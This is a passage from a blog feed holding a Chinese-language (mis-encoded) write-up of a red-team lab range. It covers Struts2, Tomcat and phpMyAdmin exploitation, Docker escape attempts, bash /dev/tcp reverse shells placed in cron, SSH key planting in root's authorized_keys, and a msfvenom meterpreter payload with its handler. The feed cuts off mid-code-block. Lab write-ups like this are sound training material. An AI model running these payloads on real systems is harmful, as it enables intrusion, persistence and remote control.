<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://blog.m1n.me</id>
    <title>M1N&#39;s Blog â€¢ Posts by &#34;writeup&#34; category</title>
    <link href="http://blog.m1n.me" />
    <updated>2021-09-20T15:49:36.000Z</updated>
    <entry>
        <id>http://blog.m1n.me/2021/09/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B%E7%AC%94%E8%AE%B0/</id>
        <title>çº¢æ—¥é¶åœº(å››)ç¬”è®°</title>
        <link rel="alternate" href="http://blog.m1n.me/2021/09/20/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E5%9B%9B%E7%AC%94%E8%AE%B0/"/>
        <content type="html">&lt;h1 id=&#34;çº¢æ—¥é¶åœºå››ç¬”è®°&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#çº¢æ—¥é¶åœºå››ç¬”è®°&#34;&gt;#&lt;/a&gt; çº¢æ—¥é¶åœº (å››) ç¬”è®°&lt;/h1&gt;
&lt;h2 id=&#34;å¤–ç½‘æ‰“ç‚¹&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#å¤–ç½‘æ‰“ç‚¹&#34;&gt;#&lt;/a&gt; å¤–ç½‘æ‰“ç‚¹&lt;/h2&gt;
&lt;h3 id=&#34;2001ç«¯å£struct2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2001ç«¯å£struct2&#34;&gt;#&lt;/a&gt; 2001 ç«¯å£ Struct2&lt;/h3&gt;
&lt;p&gt;Burp æŠ“åŒ…çœ‹åˆ° Struct2 å­—æ ·ï¼Œç›´æ¥å·¥å…·æµ‹è¯•ä¸€æŠŠæ¢­&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170347.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170720.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2002ç«¯å£tomcat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2002ç«¯å£tomcat&#34;&gt;#&lt;/a&gt; 2002 ç«¯å£ Tomcat&lt;/h3&gt;
&lt;p&gt;å¯ä»¥å‚è€ƒ https://www.freebuf.com/articles/web/271892.html&lt;/p&gt;
&lt;p&gt;ä½¿ç”¨ PUT ä¸Šä¼ å†°èé©¬ï¼Œæ³¨æ„ç›´æ¥ä¸Šä¼  &lt;code&gt;/shell.jsp&lt;/code&gt;  ä¸è¡Œå“¦&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815180101.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;2003ç«¯å£phpmyadmin-481&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2003ç«¯å£phpmyadmin-481&#34;&gt;#&lt;/a&gt; 2003 ç«¯å£ phpMyAdmin 4.8.1&lt;/h3&gt;
&lt;p&gt;å¯ä»¥å‚è€ƒ https://www.dazhuanlan.com/oliiiflorrr/topics/1144804&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;éªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815181519.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;ä½¿ç”¨ SELECT è¯­å¥ååŒ…å« session æ–‡ä»¶æ¥ get shellï¼Œå†™ shell &lt;code&gt;SELECT &amp;quot;&amp;lt;?php phpinfo();file_put_contents(&#39;m1n.php&#39;, &#39;&amp;lt;?=@eval($_POST[1]);&#39;);?&amp;gt;&amp;quot;  &lt;/code&gt; ï¼Œè®¿é—®å‘ç° &lt;code&gt;http://10.0.5.100:2003/index.php?target=db_sql.php?/../../../../../../../../../tmp/sess_a851fdf11a88214580de888e61ed1867&lt;/code&gt;  å‡ºç° phpinfoï¼Œç”¨èšå‰‘è¿æ¥ m1n.php å³å¯ã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;dockeré€ƒé€¸2002ç«¯å£çš„tomcat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dockeré€ƒé€¸2002ç«¯å£çš„tomcat&#34;&gt;#&lt;/a&gt; Docker é€ƒé€¸ï¼ˆ2002 ç«¯å£çš„ Tomcatï¼‰&lt;/h2&gt;
&lt;h3 id=&#34;å¦‚ä½•åˆ¤æ–­æ˜¯å¦åœ¨dockeré‡Œ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#å¦‚ä½•åˆ¤æ–­æ˜¯å¦åœ¨dockeré‡Œ&#34;&gt;#&lt;/a&gt; å¦‚ä½•åˆ¤æ–­æ˜¯å¦åœ¨ Docker é‡Œ&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;æ£€æŸ¥  &lt;code&gt;/.dockerenv&lt;/code&gt;  æ–‡ä»¶æ˜¯å¦å­˜åœ¨&lt;/li&gt;
&lt;li&gt;æ£€æŸ¥  &lt;code&gt;/proc/1/cgroup&lt;/code&gt;  å†…æ˜¯å¦åŒ…å« Docker ç­‰å­—ç¬¦ä¸²&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;å°è¯•dirtycowæ¼æ´é€ƒé€¸&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#å°è¯•dirtycowæ¼æ´é€ƒé€¸&#34;&gt;#&lt;/a&gt; å°è¯• DirtyCow æ¼æ´é€ƒé€¸&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;ä¸‹è½½ POCï¼š&lt;a href=&#34;https://github.com/scumjr/dirtycow-vdso&#34;&gt;https://github.com/scumjr/dirtycow-vdso&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;ç¼–è¯‘ï¼Œä¸Šä¼ ï¼Œç›‘å¬ï¼Œè¿è¡Œï¼Œæ²¡ååº”ï¼Œä¸‹ä¸€ä¸ªã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;git clone https:&lt;span class=&#34;hljs-regexp&#34;&gt;//gi&lt;/span&gt;thub.com&lt;span class=&#34;hljs-regexp&#34;&gt;/scumjr/&lt;/span&gt;dirtycow-vdso.git&lt;br&gt;cd dirtycow-vdso&lt;br&gt;make&lt;br&gt;./&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;xdeadbeef ip:port&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;å°è¯•runcå®¹å™¨é€ƒé€¸æ¼æ´cve-2019-5736&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#å°è¯•runcå®¹å™¨é€ƒé€¸æ¼æ´cve-2019-5736&#34;&gt;#&lt;/a&gt; å°è¯• runC å®¹å™¨é€ƒé€¸æ¼æ´ï¼ˆCVE-2019-5736ï¼‰&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;ä¸‹è½½ POCï¼š&lt;a href=&#34;https://github.com/Frichetten/CVE-2019-5736-PoC&#34;&gt;https://github.com/Frichetten/CVE-2019-5736-PoC&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;æ”¹ POCï¼ŒæŠŠ payload é‚£è¡Œæ”¹æˆè‡ªå·± VPS çš„ IP&lt;/li&gt;
&lt;li&gt;ç¼–è¯‘ï¼ˆå»ºè®® Linux ç¯å¢ƒä¸‹ï¼‰ &lt;code&gt;CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;ä¸Šä¼ æ–‡ä»¶ï¼Œç›‘å¬ç«¯å£ï¼Œæ‰§è¡Œï¼Œæ²¡ååº”ï¼Œä¸‹ä¸€ä¸ªã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;å°è¯•ç‰¹æƒæ¨¡å¼é€ƒé€¸&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#å°è¯•ç‰¹æƒæ¨¡å¼é€ƒé€¸&#34;&gt;#&lt;/a&gt; å°è¯•ç‰¹æƒæ¨¡å¼é€ƒé€¸&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;fdisk -l&lt;/code&gt;  æŸ¥çœ‹ç£ç›˜&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816152320.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;åœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶å¤¹ï¼ŒæŠŠ /dev/sda1 æŒ‚åœ¨åˆ°è¯¥æ–‡ä»¶å¤¹&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;mkdir&lt;/span&gt; /m&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;n&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;mount&lt;/span&gt; /dev/sda&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt; /m&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;n&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å¯ä»¥çœ‹åˆ°å®¿ä¸»æœºçš„æ–‡ä»¶éƒ½åˆ°äº† /m1n ç›®å½•ä¸‹&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;C:%5CUsers%5CM1N%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210816152534150.png&#34; alt=&#34;image-20210816152534150&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;å°è¯•å†™å®šæ—¶ä»»åŠ¡æ¥åå¼¹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#å°è¯•å†™å®šæ—¶ä»»åŠ¡æ¥åå¼¹shell&#34;&gt;#&lt;/a&gt; å°è¯•å†™å®šæ—¶ä»»åŠ¡æ¥åå¼¹ shell&lt;/h4&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;a href=&#34;https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/&#34;&gt;https://m3lon.github.io/2019/03/18 / è§£å†³ ubuntu-crontab åå¼¹ shell å¤±è´¥çš„é—®é¢˜ /&lt;/a&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;å†™æ–‡ä»¶åˆ° &lt;code&gt;/var/spool/cron/crontabs/root&lt;/code&gt; ï¼Œæ³¨æ„å†™åˆ° &lt;code&gt;/var/spool/cron/root&lt;/code&gt;  ä¸è¡Œå—·&lt;/li&gt;
&lt;li&gt;åŒæ—¶æ³¨æ„ root æ–‡ä»¶çš„æƒé™å¿…é¡»ä¸º 600&lt;/li&gt;
&lt;li&gt;æ³¨æ„å®šæ—¶ä»»åŠ¡æ–‡ä»¶å†…å®¹ä¸­ï¼Œè·¯å¾„è¦ç”¨ç»å¯¹è·¯å¾„ï¼Œå»ºè®®æŠŠå‘½ä»¤å†™æˆ &lt;code&gt;.sh&lt;/code&gt;  æ–‡ä»¶ï¼Œç„¶å &lt;code&gt;chmod +x&lt;/code&gt; ï¼Œç„¶åè°ƒç”¨ï¼Œä¸å®¹æ˜“å‡ºé”™&lt;/li&gt;
&lt;li&gt;ä¹Ÿå¯ä»¥ &lt;code&gt;*/1 * * * *  bash -c &amp;quot;bash -i  &amp;gt;&amp;amp;/dev/tcp/123.207.x.x/1234 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;åœ¨æœ¬åœ°çš„ Ubuntu20 è™šæ‹Ÿæœºä¸­æˆåŠŸåå¼¹ shellï¼Œä½†æ˜¯é¶åœºç¯å¢ƒä¸‹æ²¡æ³•æˆåŠŸï¼Œå†™å…¥äº†å®šæ—¶ä»»åŠ¡å¿…é¡» restart æ‰å¯ä»¥æ‰§è¡Œï¼Œå¦åˆ™ä¸æ‰§è¡Œï¼Œæ— å¥ˆã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;å®šæ—¶ä»»åŠ¡ç›¸å…³ç¬”è®°ï¼š&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;å®šæ—¶ä»»åŠ¡æœ‰æ—¶æ— æ³•çœ‹åˆ°æŠ¥é”™ä¿¡æ¯ï¼Œå¯ä»¥è¿™æ ·è·å–æŠ¥é”™ä¿¡æ¯&lt;/p&gt;
&lt;p&gt;&lt;code&gt;\* * * * * &#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.0.106/7777 0&amp;gt;&amp;amp;1&#39;&amp;gt;/tmp/error.txt 2&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;å®šæ—¶ä»»åŠ¡æŸ¥çœ‹æ—¥å¿—ï¼š&lt;a href=&#34;https://www.cnblogs.com/zhangshengxiang/p/11842326.html&#34;&gt;https://www.cnblogs.com/zhangshengxiang/p/11842326.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ï¼ˆ1ï¼‰æŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—ç›´æ¥ï¼š &lt;code&gt;tail -f /var/log/syslog&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;ï¼ˆ2ï¼‰æŸ¥çœ‹ crontab æ—¥å¿—ï¼š&lt;/p&gt;
&lt;p&gt;â€‹	æ–¹æ³• 1&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;. ä¿®æ”¹rsyslogæ–‡ä»¶ï¼Œå°†&lt;span class=&#34;hljs-regexp&#34;&gt;/etc/&lt;/span&gt;rsyslog.d/&lt;span class=&#34;hljs-number&#34;&gt;50&lt;/span&gt;-default.conf æ–‡ä»¶ä¸­çš„&lt;span class=&#34;hljs-comment&#34;&gt;#cron.*å‰çš„#åˆ æ‰ï¼›&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;. é‡å¯rsyslogæœåŠ¡service rsyslog restart&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;. é‡å¯cronæœåŠ¡service cron restart&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;â€‹	æ–¹æ³• 2&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;. ç¼–è¾‘ &lt;span class=&#34;hljs-regexp&#34;&gt;/etc/&lt;/span&gt;syslog.confï¼Œå¹¶ä¸”æ‰“å¼€ä»¥cron.*å¼€å§‹çš„é‚£è¡Œæ³¨é‡Šã€‚&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;. è¿è¡Œ &lt;span class=&#34;hljs-regexp&#34;&gt;/etc/i&lt;/span&gt;nit.d/sysklogd restart&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;. è¿è¡Œ &lt;span class=&#34;hljs-regexp&#34;&gt;/etc/i&lt;/span&gt;nit.d/cron restart&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;â€‹	æŸ¥çœ‹ cron æ—¥å¿—&lt;/p&gt;
&lt;figure class=&#34;highlight awk&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;. linux&lt;br&gt;çœ‹ &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log&lt;span class=&#34;hljs-regexp&#34;&gt;/cronè¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥ï¼Œå¯ä»¥ç”¨tail -f /&lt;/span&gt;var&lt;span class=&#34;hljs-regexp&#34;&gt;/log/&lt;/span&gt;cronè§‚å¯Ÿï¼ˆæˆ–è€…&lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;log/cron.logï¼‰&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;. unix&lt;br&gt;åœ¨ &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;spool&lt;span class=&#34;hljs-regexp&#34;&gt;/cron/&lt;/span&gt;tmpæ–‡ä»¶ä¸­ï¼Œæœ‰croutXXX001864çš„tmpæ–‡ä»¶ï¼Œtail è¿™äº›æ–‡ä»¶å°±å¯ä»¥çœ‹åˆ°æ­£åœ¨æ‰§è¡Œçš„ä»»åŠ¡äº†ã€‚&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;. mailä»»åŠ¡&lt;br&gt;åœ¨ &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;spool&lt;span class=&#34;hljs-regexp&#34;&gt;/mail/&lt;/span&gt;root æ–‡ä»¶ä¸­ï¼Œæœ‰crontabæ‰§è¡Œæ—¥å¿—çš„è®°å½•ï¼Œç”¨tail -f &lt;span class=&#34;hljs-regexp&#34;&gt;/var/&lt;/span&gt;spool&lt;span class=&#34;hljs-regexp&#34;&gt;/mail/&lt;/span&gt;root å³å¯æŸ¥çœ‹æœ€è¿‘çš„crontabæ‰§è¡Œæƒ…å†µ&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;å°è¯•å†™sshå…¬é’¥æ¥è¿æ¥&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#å°è¯•å†™sshå…¬é’¥æ¥è¿æ¥&#34;&gt;#&lt;/a&gt; å°è¯•å†™.ssh å…¬é’¥æ¥è¿æ¥&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;æœ¬åœ°ç”Ÿæˆå…¬ç§é’¥&lt;/p&gt;
&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;ssh&lt;/span&gt;-keygen -f m&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;n&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;chmod&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;600&lt;/span&gt; m&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;n&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æŠŠ m1n.pub æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ &lt;code&gt;/root/.ssh/&lt;/code&gt;  ç›®å½•ä¸‹ï¼ˆæ³¨æ„ï¼Œæ˜¯ /m1n ä¸‹çš„ /root/.sshï¼‰ï¼Œæ²¡æœ‰è¿™ä¸ªç›®å½•å°±åˆ›å»ºè¿™ä¸ªç›®å½•&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æŠŠ m1n.pub çš„æ–‡ä»¶å†…å®¹å†™åˆ° authorized_keys æ–‡ä»¶ä¸­ &lt;code&gt;cat m1n.pub &amp;gt; authorized_keys&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç„¶å &lt;code&gt;ssh -i m1n root@ip&lt;/code&gt;  è¿æ¥ï¼Œå³å¯&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816161055.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;è¸©å‘ç¬”è®°ï¼šä¸è¦å†™å…¬é’¥åˆ° &lt;code&gt;/home/ubuntu/.ssh/&lt;/code&gt;  ç›®å½•ä¸‹ï¼Œè¿ä¸ä¸Šã€‚&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;å†…ç½‘æ¸—é€&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#å†…ç½‘æ¸—é€&#34;&gt;#&lt;/a&gt; å†…ç½‘æ¸—é€&lt;/h2&gt;
&lt;h3 id=&#34;ä¼ &#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ä¼ &#34;&gt;#&lt;/a&gt; ä¼ ğŸ&lt;/h3&gt;
&lt;h4 id=&#34;msf&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf&#34;&gt;#&lt;/a&gt; MSFğŸ&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;ç”Ÿæˆ msfğŸ&lt;/p&gt;
&lt;p&gt;&lt;code&gt;msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.192.168.145 LPORT=4444 -f elf &amp;gt; mshell.elf&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æŠŠğŸå„¿ä¼ åˆ°ç›®æ ‡æœºå­ä¸Šé¢&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;æ”»å‡»æœºæ‰§è¡Œä»¥ä¸‹&lt;/p&gt;
&lt;figure class=&#34;highlight routeros&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;use exploit/multi/handler&lt;br&gt;&lt;span class=&#34;hljs-builtin-name&#34;&gt;set&lt;/span&gt; payload linux/x64/meterpreter/reverse_tcp&lt;br&gt;&lt;span class=&#34;hljs-builtin-name&#34;&gt;set&lt;/span&gt; lhost 10.192.168.145&lt;br&gt;&lt;span class=&#34;hljs-builtin-name&#34;&gt;set&lt;/span&gt; lport 4444&lt;br&gt;run&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ç›®æ ‡æœºå™¨æ·»åŠ æƒé™åæ‰§è¡Œ mshell.elf&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;kali æ¥æ”¶åˆ° shell&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108261512059.png&#34; alt=&#34;&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;
&lt;p&gt;msf æ‹¿åˆ° shell åï¼Œéœ€è¦å¯¼å…¥è·¯ç”±ï¼Œä½¿ç”¨ msf6 çš„è‡ªåŠ¨è·¯ç”±å¯¼å…¥&lt;/p&gt;
&lt;figure class=&#34;highlight stata&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs stata&#34;&gt;background&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;use&lt;/span&gt; &lt;span 